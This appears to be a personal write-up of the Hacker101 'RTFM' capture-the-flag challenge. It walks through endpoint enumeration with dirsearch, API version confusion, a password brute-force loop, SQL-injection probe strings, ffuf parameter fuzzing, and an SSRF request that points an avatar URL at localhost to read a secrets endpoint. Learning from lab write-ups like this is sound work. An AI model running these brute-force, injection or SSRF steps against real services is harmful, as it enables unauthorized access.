# Hacker101 RTFM

https://ctf.hacker101.com/ctf

```bash
% export BASE_URL='https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com'
```

We don't get much for starters:

```bash
% curl ${BASE_URL}
API base located at /api/v1/
% curl ${BASE_URL}/api/v1
["Endpoint not found"]
```

I've been using `dirsearch` (https://github.com/maurosoria/dirsearch) to 
enumerate endpoints:

```bash
% python3 dirsearch.py -u ${BASE_URL}

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/

[15:15:36] Scanning: 
[15:16:07] 200 -    3KB - /api/v2/swagger.json                              
                                                                             
Task Completed
```

That's something! Off to a good start:

```bash
% curl --silent ${BASE_URL}/api/v2/swagger.json | jq
{
  "swagger": "2.0",
  "flag": "FLAG",
  "info": {
[...]
```

We get a handful of endpoints:

```bash
% curl --silent ${BASE_URL}/api/v2/swagger.json | jq '.paths' | grep '^  "'     
  "/api/v2/user": {
  "/api/v2/user/login": {
  "/api/v2/admin/user-list": {
  "/api/v2/user/posts/{id}": {
```

`/api/v2/user` POST endpoint is unauthenticated - that's promising. So is 
`/api/v2/user/login`, but that requires a username and a password (maybe 
something to look at later).

```bash
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v2/user
{"username":"pizza","flag":"FLAG","message":"User created go to \/api\/v2\/user\/login to login"}%
% 
```

Let's start a session as well:

```bash
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v2/user/login
{"session":"edf12810e48a2bcf2d039b8d31851622"}%
```

Let's check out some endpoints:

```bash
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user           
{"username":"pizza"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/admin/user-list
{"error":"Your user level needs to be an admin"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user/posts/1
{"error":"Post does not belong to you"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user/posts/2
{"error":"Post does not exist"}
```

Not much. What about those `/api/v1` endpoints the home page mentioned?

```bash
% curl ${BASE_URL}/api/v1/swagger.json                                  
["Endpoint not found"]
%
curl ${BASE_URL}/api/v1/login
["Endpoint not found"]
%
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v1/user/login
{"token":"TOKEN"}
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/admin/user-list
["Endpoint not found"]
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/admin/user-list
["Endpoint not found"]
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/user/posts/1
{"id":1,"post":"You got the Post: FLAG","analytics":"\/api\/v1\/post-analytics\/3c8a6664b8203c2e0b2b24972ccf5ce3"}
% 
```

Alright! A flag, and a bonus endpoint to boot. Anything there?

```bash
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/post-analytics/3c8a6664b8203c2e0b2b24972ccf5ce3
{"hash":"3c8a6664b8203c2e0b2b24972ccf5ce3","post":1,"views":34373}
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/post-analytics/
{"campaigns":["3c8a6664b8203c2e0b2b24972ccf5ce3"]}
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/campaigns
["Endpoint not found"]
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/campaigns/
["Endpoint not found"]
%
% curl -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/campaigns/3c8a6664b8203c2e0b2b24972ccf5ce3
["Endpoint not found"]
%
```

Maybe worth exploring. Possibly something we can explore in the v2 API as well? 
Let's put a pin in that for the time being. We've got three out of eight flags,
let's start back at the top 

Let's hit the API endpoints we know about with `dirsearch` again:

```
% python3 dirsearch.py -u ${BASE_URL}/api/v1/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/

[16:10:32] Scanning: api/v1/
[16:11:13] 200 -   132B - /api/v1/config
[16:11:13] 200 -   132B - /api/v1/config/
[16:11:39] 403 -    51B - /api/v1/secrets
[16:11:39] 403 -    51B - /api/v1/secrets/
[16:11:41] 200 -    13B - /api/v1/status?full=true
[16:11:41] 200 -    13B - /api/v1/status
[16:11:41] 200 -    13B - /api/v1/status/
[16:11:49] 400 -    49B - /api/v1/user
[16:11:49] 400 -    49B - /api/v1/user/

Task Completed
% python3 dirsearch.py -u ${BASE_URL}/api/v2/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/

[16:22:40] Scanning: api/v2/
[16:23:57] 200 -    3KB - /api/v2/swagger.json                              
[16:24:00] 400 -    51B - /api/v2/user                                      
[16:24:00] 400 -    51B - /api/v2/user/                                     
                                                                             
Task Completed
%
% # That's something! 
% curl ${BASE_URL}/api/v1/config 
{"server":"Neptune","version":"1.3.94","private_key":"FLAG"}%    
```

Halfway there! That secrets endpoint looks interesting, too - I think if we can 
find a way to get admin access we could probably get a flag or two. 

Is there a way to create an admin user? There might be an undocumented flag, or
maybe we can figure out the admin username and brute-force the password. The 
error message we got was `{"error":"Your user level needs to be an admin"}`. 

```
% curl -d'username=admin&password=pizza' ${BASE_URL}/api/v2/user
{"error":"Username already exists"}
% 
% # Neither of these produced users that could access ${BASE_URL}/api/v2/admin/user-list
% curl -d'username=pizza1&password=pizza&admin=true' ${BASE_URL}/api/v2/user
% curl -d'username=pizza2&password=pizza&level=admin' ${BASE_URL}/api/v2/user
```

Maybe brute-force? No luck with https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt

```
for x in $(cat passwords.txt); do 
  echo "" 
  echo $x 
  curl -d"username=admin&password=${x}" ${BASE_URL}/api/v2/user/login
done
```

Maybe SQL injection? No luck with a handful of attacks:

```
% curl -d"username=admin&password='" ${BASE_URL}/api/v2/user/login
% curl -d"username='&password='" ${BASE_URL}/api/v2/user/login
% curl -d'username="&password="' ${BASE_URL}/api/v2/user/login
% curl -d'username="&password=asdf' ${BASE_URL}/api/v2/user/login
% curl -d'username=@&password=asdf' ${BASE_URL}/api/v2/user/login
% curl -d'username=*&password=asdf' ${BASE_URL}/api/v2/user/login
% curl -d'username=../&password=asdf' ${BASE_URL}/api/v2/user/login
% curl -d'username=;&password=asdf' ${BASE_URL}/api/v2/user/login
% curl -d'username=;&password=;' ${BASE_URL}/api/v2/user/login
% curl -d'username=/**;&password=;' ${BASE_URL}/api/v2/user/login
{"error":"Invalid username \/ password combination"}%
```

This isn't working. This is a CTF with hints, so let's take a look at those.
Maybe we can edit our profile? Doesn't look like we have anything on v2, but
for v1:

```
% curl -XPUT -H 'X-Token: TOKEN' ${BASE_URL}/api/v1/user
{"error":"No updatable fields supplied"}
```

We don't have documentation for this endpoint. What can we try?
 - Headers
 - PUT data
 - URL arguments

What are some good nouns/verbs to use?
 - level = admin (from the error message)
 - type = admin
 - admin = true

None of these worked. What am I missing? I read a write-up https://github.com/8r0wn13/hacker101_ctf/blob/main/RTFM.md
that suggested you could use `ffuf` to fuzz endpoints. Maybe we could find it that way?

I tried a number of options until I landed on something:

```
% history | grep ffuf

 # Hindsight is 20/20 - these failed because ffuf default behavior is _matching_ on 
 # certain HTTP status codes, but we're looking for an HTTP 400 with a different error message. 
 1261  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=asdf'
 1262  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=asdf' -fr '.*No updatable.*'
 1264  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=FUZZ' -fr '.*No updatable.*'
 1265  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=FUZZ' -fr 'error'
 1267  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=1' -fr 'http'

 # Troubleshooting the matching issue - this matched everything. 
 1269  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=1' -mr "updat"

 # Finally, the correct incantation - `-mc "all"` matches all HTTP status codes. 
 1273  ffuf -w common.txt -X PUT -H 'X-Token: TOKEN' -u "${BASE_URL}/api/v1/user" -d 'FUZZ=1' -fr "upda" -mc "all"
```

That gets us the updatable field, which gives us a way to retrieve the "secrets" endpoint:

```
curl -X PUT -d"avatar=http://localhost/api/v1/secrets/" -H 'X-Token: TOKEN' "${BASE_URL}/api/v1/user"
{"error":"Non Image detected","example_data":"{\"private_key\":\"FLAG\"}"}
```

That's a little sour, since I had to look up the answer. But, `ffuf` seems useful!

